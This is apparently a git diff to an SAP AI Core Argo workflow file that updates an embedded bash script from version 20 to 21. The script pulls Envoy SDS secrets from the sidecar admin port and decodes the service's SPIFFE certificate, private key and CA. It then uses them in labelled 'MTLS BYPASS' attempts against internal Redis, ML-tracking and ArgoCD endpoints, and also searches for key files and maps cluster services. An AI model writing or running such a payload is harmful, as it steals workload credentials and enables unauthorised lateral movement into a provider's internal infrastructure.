@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "20.0.0"
+    ai.sap.com/version: "21.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,92 +24,59 @@ spec:
       - bash
       - -c
       - |
-        echo "# trigger-sync
-        echo "=== V20 SPIFFE CERT EXTRACTION ==="
-        
-        # Get SDS secrets from Envoy
+        echo "=== V21 SPIFFE CERT EXTRACTION ==="
         echo "=== SDS DUMP ==="
-        SDS=$(curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1)
-        echo "SDS_BYTES=$(echo "$SDS" | wc -c)"
-        
-        # Save full SDS dump
+        SDS=$(curl -s http://localhost:15000/config_dump?resource=dynamic_active_secrets 2>&1)
+        echo "SDS_BYTES=$(echo $SDS | wc -c)"
         echo "$SDS" > /tmp/sds.json
-        
-        # Extract inline_bytes for certs using grep/sed
         echo "=== CERT EXTRACTION ==="
-        
-        # Extract certificate chain (base64 encoded PEM)
-        CERT_B64=$(echo "$SDS" | grep -A1 '"certificate_chain"' | grep '"inline_bytes"' | head -1 | sed 's/.*"inline_bytes": "//;s/".*//')
+        CERT_B64=$(echo "$SDS" | grep -A1 certificate_chain | grep inline_bytes | head -1 | sed 's/.*inline_bytes.*: *"//;s/".*//')
         if [ -n "$CERT_B64" ]; then
           echo "$CERT_B64" | base64 -d > /tmp/cert.pem 2>/dev/null
           echo "CERT_EXTRACTED: $(wc -c < /tmp/cert.pem) bytes"
           openssl x509 -in /tmp/cert.pem -text -noout 2>&1 | head -25
-          echo ""
         else
-          echo "NO CERT FOUND IN SDS"
-          # Show raw SDS structure
-          echo "$SDS" | head -c 3000
+          echo "NO CERT VIA GREP"
+          echo "$SDS" | head -c 5000
         fi
-        
-        # Extract private key
-        KEY_B64=$(echo "$SDS" | grep -A1 '"private_key"' | grep '"inline_bytes"' | head -1 | sed 's/.*"inline_bytes": "//;s/".*//')
+        KEY_B64=$(echo "$SDS" | grep -A1 private_key | grep inline_bytes | head -1 | sed 's/.*inline_bytes.*: *"//;s/".*//')
         if [ -n "$KEY_B64" ]; then
           echo "$KEY_B64" | base64 -d > /tmp/key.pem 2>/dev/null
           echo "KEY_EXTRACTED: $(wc -c < /tmp/key.pem) bytes"
-          echo "KEY_TYPE: $(head -1 /tmp/key.pem)"
+          echo "KEY_HEADER: $(head -1 /tmp/key.pem)"
         else
-          echo "NO KEY FOUND IN SDS"
+          echo "NO KEY VIA GREP"
         fi
-        
-        # Extract CA cert
-        CA_B64=$(echo "$SDS" | grep -A1 '"trusted_ca"' | grep '"inline_bytes"' | head -1 | sed 's/.*"inline_bytes": "//;s/".*//')
+        CA_B64=$(echo "$SDS" | grep -A1 trusted_ca | grep inline_bytes | head -1 | sed 's/.*inline_bytes.*: *"//;s/".*//')
         if [ -n "$CA_B64" ]; then
           echo "$CA_B64" | base64 -d > /tmp/ca.pem 2>/dev/null
           echo "CA_EXTRACTED: $(wc -c < /tmp/ca.pem) bytes"
         else
-          echo "NO CA FOUND IN SDS"
+          echo "NO CA VIA GREP"
         fi
-        
-        # If certs extracted, try mTLS connections
         if [ -f /tmp/cert.pem ] && [ -f /tmp/key.pem ]; then
-          echo "=== MTLS BYPASS ==="
-          
+          echo "=== MTLS BYPASS ATTEMPTS ==="
           echo "--- Redis aicore ---"
-          echo -e "PING\r\n" | timeout 5 openssl s_client -connect 100.107.100.17:6379 -cert /tmp/cert.pem -key /tmp/key.pem -CAfile /tmp/ca.pem -quiet 2>&1 | head -10
+          printf "PING\r\n" | timeout 5 openssl s_client -connect 100.107.100.17:6379 -cert /tmp/cert.pem -key /tmp/key.pem -CAfile /tmp/ca.pem -quiet 2>&1 | head -10
+          echo "--- Redis user-mgmt ---"
+          printf "PING\r\nINFO\r\n" | timeout 5 openssl s_client -connect 100.109.69.212:6379 -cert /tmp/cert.pem -key /tmp/key.pem -CAfile /tmp/ca.pem -quiet 2>&1 | head -20
+          echo "--- ml-tracking mTLS ---"
+          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem https://ml-tracking-service.ml-tracking.svc.cluster.local/ 2>&1 | head -c 500
           echo ""
-          
-          echo "--- Redis user-management ---"
-          echo -e "PING\r\nINFO\r\n" | timeout 5 openssl s_client -connect 100.109.69.212:6379 -cert /tmp/cert.pem -key /tmp/key.pem -CAfile /tmp/ca.pem -quiet 2>&1 | head -20
+          echo "--- ArgoCD mTLS ---"
+          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem https://100.107.174.75/api/version 2>&1 | head -c 500
           echo ""
-          
-          echo "--- ml-tracking with mTLS ---"
-          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem "https://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 500
+          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem https://100.107.174.75/api/v1/applications 2>&1 | head -c 1000
           echo ""
-          
-          echo "--- ArgoCD with mTLS ---"
-          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem "https://100.107.174.75/api/version" 2>&1 | head -c 500
-          echo ""
-          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 1000
+          echo "--- Envoy proxy bypass ---"
+          curl -s --connect-timeout 5 http://localhost:15001/redis.aicore.svc.cluster.local:6379 2>&1 | head -c 500
           echo ""
         fi
-        
-        # Search for any cert/key files on the filesystem
-        echo "=== FILESYSTEM CERT SEARCH ==="
-        find / -maxdepth 4 \( -name "*.pem" -o -name "*.crt" -o -name "*.key" -o -name "root-cert*" -o -name "cert-chain*" \) 2>/dev/null | head -20
-        
-        # Check /etc/istio
+        echo "=== FILESYSTEM CERTS ==="
+        find / -maxdepth 4 -name "*.pem" -o -name "*.crt" -o -name "*.key" -o -name "root-cert*" -o -name "cert-chain*" 2>/dev/null | head -20
         ls -laR /etc/istio/ 2>/dev/null | head -20
-        
-        # Check proc for envoy
-        ls -la /proc/*/root/etc/istio/ 2>/dev/null | head -5
-        
-        # Check envoy config file
         cat /etc/istio/proxy/envoy-rev.json 2>/dev/null | head -c 2000
         echo ""
-        
-        # Service map from clusters
         echo "=== SERVICE MAP ==="
-        curl -s "http://localhost:15000/clusters" 2>&1 | grep "::hostname::" | sed 's/.*:://;s/::hostname::/: /' | sort -u | head -50
-        
-        echo "=== V20 COMPLETE ==="
-        # sync-trigger-1
+        curl -s http://localhost:15000/clusters 2>&1 | grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' | sort -u | head -50
+        echo "=== V21 DONE ==="
